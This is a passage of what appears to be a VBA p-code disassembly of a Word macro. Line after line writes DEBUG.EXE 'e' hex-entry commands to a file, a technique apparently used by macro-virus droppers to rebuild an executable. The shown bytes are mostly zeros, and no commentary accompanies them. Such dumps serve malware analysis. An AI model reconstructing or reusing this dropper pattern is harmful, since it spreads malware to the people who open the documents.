' 	Add 
' 	LitStr 0x0037 "e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #444:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #445:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #446:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #447:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #448:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #449:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #450:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #451:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #452:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #453:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #454:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #455:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #456:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #457:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #458:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #459:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #460:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #461:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #462:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #463:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #464:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #465:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #466:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #467:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #468:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #469:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #470:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #471:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #472:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #473:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #474:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #475:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #476:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #477:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #478:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #479:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #480:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #481:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #482:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #483:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #484:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #485:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #486:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f00 00 10 00 00 54 01 00 00 0e 38 12 38 16 38 1a 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #487:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f10 1e 38 22 38 26 38 2a 38 38 38 83 38 99 38 ae 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #488:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f20 b4 38 be 38 c6 38 cc 38 d3 38 d9 38 e0 38 e6 38 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #489:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f30 ed 38 f3 38 f9 38 00 39 06 39 0c 39 14 39 1e 39 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #490:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f40 35 39 41 39 48 39 50 39 5d 39 6d 39 77 39 7d 39 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #491:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f50 83 39 88 39 93 39 9a 39 e1 39 e7 39 0e 3a 16 3a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #492:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f60 21 3a 2a 3a 37 3a 3e 3a 49 3a 50 3a 56 3a 62 3a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #493:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f70 68 3a 71 3a 85 3a 8c 3a 92 3a a1 3a a8 3a ae 3a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #494:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f80 bd 3a c4 3a cb 3a d4 3a db 3a f4 3a fb 3a 08 3b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #495:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1f90 1f 3b 25 3b 30 3b 3d 3b 44 3b 58 3b 5e 3b 65 3b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #496:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1fa0 70 3b 7c 3b 3e 38 49 38 ef 39 fa 39 92 3b 98 3b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #497:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
